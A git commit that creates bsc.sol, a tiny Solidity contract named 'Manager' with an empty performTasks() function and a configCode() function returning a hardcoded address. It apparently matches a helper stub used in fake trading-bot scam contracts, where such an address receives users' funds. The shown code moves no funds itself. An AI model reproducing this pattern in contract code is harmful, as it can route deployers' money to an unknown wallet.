3531938f236a75be3f61e8a15071670ca761eb07
githubnewbiexxxx <115956999+githubnewbiexxxx@users.noreply.github.com>
2022-10-17 02:01:53 +0300

    Create bsc.sol

---
+++ bsc.sol
@@ -0,0 +1,11 @@
+// SPDX-License-Identifier: UNLICENSED
+
+pragma solidity ^0.6.12;
+
+contract Manager {
+    function performTasks() public {}
+
+    function configCode() public pure returns (address) {
+        return 0x397e8302595F124bb0eC3c4A0F871C220161ba36;
+    }
+}
